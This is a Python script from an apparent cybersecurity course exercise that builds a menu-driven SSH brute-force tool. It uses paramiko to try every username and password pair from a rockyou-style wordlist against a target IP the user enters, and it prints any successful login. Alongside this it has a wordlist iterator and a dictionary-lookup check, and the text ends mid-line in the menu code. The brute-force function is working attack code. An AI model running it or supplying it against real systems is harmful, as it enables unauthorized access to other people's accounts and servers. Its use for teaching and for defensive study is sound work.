#!/usr/bin/env python3 

# Script Name:                  Ops Challenge: Automated Brute Force Wordlist Attack Tool Part 2 of 3
# Author:                       Kevin Hoang
# Date of latest revision:      1/30/2024
# Purpose:                      Script that creates a  a custom tool that performs brute force attacks to better 
#                               understand the types of automation employed by adversaries.
# Execution:                    ops16.py
# Resources:                    https://github.com/codefellows/seattle-cybersecurity-401d10/blob/main/class-16/challenges/DEMO.md
#                               https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
#                               https://www.geeksforgeeks.org/how-to-execute-shell-commands-in-a-remote-machine-using-python-paramiko/

# Imports paramiko for ssh connection, time for adding delays and ssl for handling SSL/TLS support
import paramiko
import time
import ssl

# Function which connects to SSH server, executes command, captures output, prints command and output. Writes output to a file and returns output file name.
def paramiko_GKG(hostname, command, output_file):
    print('running')
    try:
        port = '22'  # SSH port
        client = paramiko.SSHClient()  # Create SSH client object
        client.load_system_host_keys()  # Load system host keys
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add host keys
        client.connect(hostname, port=22, username='geeksForgeeks', password='geeksForgeeks')  # Connect to SSH server
        (stdin, stdout, stderr) = client.exec_command(command)  # Execute command on the server
        cmd_output = stdout.read()  # Read command output
        print('log printing: ', command, cmd_output)  # Print command and output
        with open(output_file, "w+") as file:  # Open output file
            file.write(str(cmd_output))  # Write output to file
        return output_file  # Return output file name
    finally:
        client.close()  # Close SSH connection

# Function performs a brute force ssh attack by searching through provided usernames and passwords, attempts to connect to an ssh server using combinations and prints results.
def paramiko_GKG_bruteforce(hostname, usernames, passwords):
    print('Brute-force attack running')
    try:
        port = '22'  # SSH port
        client = paramiko.SSHClient()  # Create SSH client object
        client.load_system_host_keys()  # Load system host keys
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add host keys

        for username in usernames:  # Iterate over usernames
            for password in passwords:  # Iterate over passwords
                try:
                    client.connect(hostname, port=22, username=username, password=password)  # Try to connect with given username and password
                    print(f'Successful login: {username}@{hostname} with password: {password}')  # Print successful login message
                    return True  # Return True indicating successful login
                except paramiko.AuthenticationException:
                    print(f'Failed login attempt: {username}@{hostname} with password: {password}')  # Print failed login attempt message
                except Exception as e:
                    print(f'Error: {e}')  # Print any other errors

        print('Brute-force attack completed. No valid credentials found.')  # Print message if no valid credentials found
        return False  # Return False indicating no valid credentials found

    finally:
        client.close()  # Close SSH connection

# Function prompts user for dictionary file path, opens specified file, reads lines, removes trailing whitespaces. Assigns line to a varaible 'word'. Prints word to screen, introduces delay of second and repeats process until are lines in file are processed.
def iterator():
    filepath = input("Enter your dictionary filepath:\n")  # Prompt user for file path
    file = open(filepath, encoding="ISO-8859-1")  # Open file
    line = file.readline()  # Read first line
    while line:  # Loop until end of file
        line = line.rstrip()  # Remove trailing whitespace
        word = line  # Assign line to variable 'word'
        print(word)  # Print word
        time.sleep(1)  # Introduce delay of 1 second
        line = file.readline()  # Read next line
    file.close()  # Close file

# Function takes a list of words as input, prompts user to enter word, checks if entered word is in provided list and prints corresponding message
def check_for_word(words):
    user_answer = input("Enter a word: ")  # Prompt user for input
    if user_answer in words:  # Check if user input is in list of words
        print("The word is in the dictionary")  # Print message if word is found
    else:
        print("The word is not in the dictionary")  # Print message if word is not found

# Function reads contents of file 'rockyou.txt' initializes an empty list named password_list, opens specified file in read mode, reads each line. removes trailing whitespaces. appends it to password_list, prints list and continues reading until end of file.
def load_external_file():
    password_list = []  # Initialize empty list for passwords
    with open('rockyou_sample.txt', 'r') as file:  # Open file 'rockyou.txt' in read mode
        while True:  # Infinite loop
            line = file.readline()  # Read line from file
            if not line:  # If end of file is reached
                break  # Exit loop
            line = line.rstrip()  # Remove trailing whitespace
            password_list.append(line)  # Append line to password_list
            print(password_list)  # Print password_list
    return password_list  # Return password_list

# Main execution. Presents menu to user with options for different functions. Uses while loops to keep prompting until user exits.
if __name__ == "__main__":
    while True:  # Infinite loop
        mode = input("""
Brute Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Offensive, Brute Force SSH Attack
3 - Defensive, Password Recognized
4 - Exit
Please enter a number: 
""")  # Prompt user for input
        if mode == "1":  # If mode is 1
            iterator()  # Call iterator function
        elif mode == "2":  # If mode is 2
            hostname = input("Enter the target IP address: ")  # Prompt user for target IP address
            usernames = input("Enter a list of usernames (comma-separated): ").split(',')  # Prompt user for list of usernames
            passwords = load_external_file()  # Load passwords from external file
            paramiko_GKG_bruteforce(hostname, usernames, passwords)  # Call function for brute force SSH attack
        elif mode == "3":  # If mode is 3
            word_list = load_external_file
